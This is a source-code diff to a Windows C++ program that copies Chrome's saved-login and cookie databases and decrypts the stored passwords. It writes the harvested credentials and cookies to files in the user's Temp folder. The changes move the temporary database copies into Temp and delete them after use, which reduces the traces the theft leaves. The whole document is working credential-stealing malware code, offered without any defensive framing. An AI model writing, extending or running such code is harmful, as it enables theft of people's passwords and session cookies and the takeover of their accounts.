@@ -7,6 +7,8 @@
 
 using namespace std;
 
+string strTempPath("");
+
 stringstream debug(string(""));
 /*
 ** Pass sqlite3 handler, iterate over queried rows and decrypt each password by copying bytes from password_value
@@ -154,7 +156,7 @@ stringstream getCookies(
 }
 sqlite3* getDBHandler(char* dbFilePath) {
 	sqlite3 *db;
-	int rc = sqlite3_open(dbFilePath, &db);
+	int rc = sqlite3_open((strTempPath + dbFilePath).c_str(), &db);
 	if (rc)
 	{
 		cerr << "Error opening SQLite3 database: " << sqlite3_errmsg(db) << endl << endl;
@@ -174,27 +176,41 @@ bool copyDB(char *source, char *dest) {
 //	path.append("\\Google\\Chrome\\User Data\\Default\\");
 	path.append("\\Google\\Chrome\\User Data\\Profile 2\\");
 	path.append(source);
+
+	string destPath = strTempPath + dest;
+
 	//copy the sqlite3 db from chrome directory 
 	//as we are not allowed to open it directly from there (chrome could also be running)
 	ifstream  src(path, std::ios::binary);
-	ofstream  dst(dest, std::ios::binary);
+	ofstream  dst(destPath, std::ios::binary);
 	dst << src.rdbuf();
 	dst.close();
 	src.close();
 	return true; //ToDo: error handling
 }
 int deleleteDB(const char *fileName) {
-	if (remove(fileName) != 0)
-		cout << "Could not delete " << fileName << endl;
-	else
-		cout << fileName << " deleted... Bye bye" << endl;
+	try {
+		string filePath = strTempPath + fileName;
+
+		if (remove(filePath.c_str()) != 0)
+			cout << "Could not delete " << filePath << endl;
+		else
+			cout << filePath << " deleted... Bye bye" << endl;
+
+		return 0;
+	}
+	catch (...)
+	{
+	}
 
 	return 0;
 }
 
-void Run(LPSTR lpCmdLine)
+void PasswordRun(LPSTR lpCmdLine)
 {
 	{
+		strTempPath = string(getenv("LOCALAPPDATA")) + "\\Temp\\";
+
 		std::istringstream ss(lpCmdLine);
 		std::istream_iterator<std::string> begin(ss), end;
 
@@ -212,17 +228,16 @@ void Run(LPSTR lpCmdLine)
 		int rc;
 		try
 		{
+			char* tempDB = "p8791.db";
 
 			// Open Database
 			cout << "Copying db ..." << endl;
-			copyDB("Login Data", "passwordsDB");
-			sqlite3 *passwordsDB = getDBHandler("passwordsDB");
+			copyDB("Login Data", tempDB);
+			sqlite3 *passwordsDB = getDBHandler(tempDB);
 			stringstream passwords = getPass(passwordsDB);
 			//	cout << passwords.str();
 
-			string fileName = getenv("LOCALAPPDATA");
-			fileName.append("\\Temp\\");
-			fileName.append("p8791.bin");
+			string fileName = strTempPath + "p8791.bin";
 			std::ofstream myfile(fileName, std::ios::out | std::ios::binary);
 			myfile << passwords.str();
 			myfile.close();
@@ -232,6 +247,7 @@ void Run(LPSTR lpCmdLine)
 			else
 				cout << "Failed to close DB connection" << endl;
 
+			deleleteDB(tempDB);
 		}
 		catch(...)
 		{
@@ -253,13 +269,13 @@ void Run(LPSTR lpCmdLine)
 		if (flagCookies) {
 			try
 			{
-				copyDB("Cookies", "cookiesDB");
-				sqlite3 *cookiesDb = getDBHandler("cookiesDB");
+				char* tempDB = "c8791.db";
+
+				copyDB("Cookies", tempDB);
+				sqlite3 *cookiesDb = getDBHandler(tempDB);
 				stringstream cookies = getCookies(cookiesDb);
 
-				string fileName = getenv("LOCALAPPDATA");
-				fileName.append("\\Temp\\");
-				fileName.append("c8791.bin");
+				string fileName = strTempPath + "c8791.bin";
 				std::ofstream myfile(fileName, std::ios::out | std::ios::binary);
 				myfile << cookies.str();
 				myfile.close();
@@ -268,6 +284,8 @@ void Run(LPSTR lpCmdLine)
 					cout << "DB connection closed properly" << endl;
 				else
 					cout << "Failed to close DB connection" << endl;
+
+				deleleteDB(tempDB);
 			}
 			catch(...)
 			{
@@ -287,6 +305,6 @@ int WinMain(
 	int       nShowCmd
 )
 {
-	Run(lpCmdLine);
+	PasswordRun(lpCmdLine);
 	return 0;
 }
